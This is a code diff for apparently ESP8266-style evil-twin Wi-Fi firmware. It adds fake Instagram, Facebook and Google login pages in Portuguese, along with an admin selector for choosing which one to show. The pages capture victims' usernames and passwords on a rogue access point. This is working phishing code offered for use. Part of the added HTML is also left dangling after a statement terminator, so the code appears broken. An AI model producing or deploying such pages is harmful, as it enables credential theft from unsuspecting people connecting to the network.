@@ -27,6 +27,8 @@ void clearArray() {
 
 String _correct = "";
 String _tryPassword = "";
+int selectedTemplate = 0; // 0 = genérico, 1 = Instagram, 2 = Facebook
+
 
 // Default main strings
 #define SUBTITLE "ACCESS POINT RESCUE MODE"
@@ -58,9 +60,67 @@ String footer() {
 }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
+    if (selectedTemplate == 1) {
+        // Template Instagram
+        return "<html><head><title>Instagram</title>"
+               "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+               "<style>body{font-family:sans-serif;background:#fafafa;text-align:center;padding:20px;}"
+               "input {width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #ccc;}"
+               "input[type=submit] {background:#3897f0; color:white; border:none; font-weight:bold; cursor:pointer;}"
+               "</style>"
+               "</head><body>"
+               "<img src='https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png' width='100'><br><br>"
+               "<form action='/' method='post'>"
+               "<input type='text' name='username' placeholder='Telefone, nome de usuário ou email' required><br>"
+               "<input type='password' name='password' placeholder='Senha' required><br>"
+               "<input type='submit' value='Entrar'>"
+               "</form>"
+               "</body></html>";
+    } 
+    else if (selectedTemplate == 2) {
+        // Template Facebook
+        return "<html><head><title>Facebook</title>"
+               "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+               "<style>body{font-family:sans-serif;background:#f0f2f5;text-align:center;padding:20px;}"
+               "input {width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #ccc;}"
+               "input[type=submit] {background:#1877f2; color:white; border:none; font-weight:bold; cursor:pointer;}"
+               "</style>"
+               "</head><body>"
+               "<h1>Facebook</h1><br>"
+               "<form action='/' method='post'>"
+               "<input type='text' name='username' placeholder='Email ou telefone' required><br>"
+               "<input type='password' name='password' placeholder='Senha' required><br>"
+               "<input type='submit' value='Entrar'>"
+               "</form>"
+               "</body></html>";
+    } 
+    else if (selectedTemplate == 3) {
+        // Template Google
+        return "<html><head><title>Google</title>"
+               "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+               "<style>body{font-family: Arial, sans-serif; background:#fff; text-align:center; padding:20px;}"
+               "input {width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #ccc;}"
+               "input[type=submit] {background:#4285f4; color:white; border:none; font-weight:bold; cursor:pointer;}"
+               "</style>"
+               "</head><body>"
+               "<img src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg' width='150'><br><br>"
+               "<form action='/' method='post'>"
+               "<input type='email' name='username' placeholder='Email ou telefone' required><br>"
+               "<input type='password' name='password' placeholder='Senha' required><br>"
+               "<input type='submit' value='Próximo'>"
+               "</form>"
+               "</body></html>";
+    }
+    else {
+        // Template padrão (seu original)
+        return header(TITLE) + "<div>" + BODY +
+               "</div><form action='/' method=post><label>WiFi password:</label>" +
+               "<input type=password name='password' minlength='8'><input type=submit value=Continue></form>" +
+               footer();
+    }
 }
+
+
 
 void setup() {
   Serial.begin(115200);
@@ -126,8 +186,22 @@ String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0
                    "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                    "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                    "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+                   "<form method='post' action='/'>"
+         "<label>Selecionar template:</label>"
+         "<select name='template'>"
+         "<option value='0'" + String(selectedTemplate == 0 ? " selected" : "") + ">Padrão</option>"
+         "<option value='1'" + String(selectedTemplate == 1 ? " selected" : "") + ">Instagram</option>"
+         "<option value='2'" + String(selectedTemplate == 2 ? " selected" : "") + ">Facebook</option>"
+         "<option value='3'" + String(selectedTemplate == 3 ? " selected" : "") + ">Google</option>"
+         "</select>"
+         "<input type='submit' value='Salvar'>"
+         "</form><br>";
 
 void handleIndex() {
+if (webServer.hasArg("template")) {
+    selectedTemplate = webServer.arg("template").toInt();
+}
+
 
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
@@ -240,6 +314,11 @@ void handleIndex() {
 void handleAdmin() {
 
   String _html = _tempHTML;
+
+if (webServer.hasArg("template")) {
+    selectedTemplate = webServer.arg("template").toInt();
+}
+
 
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
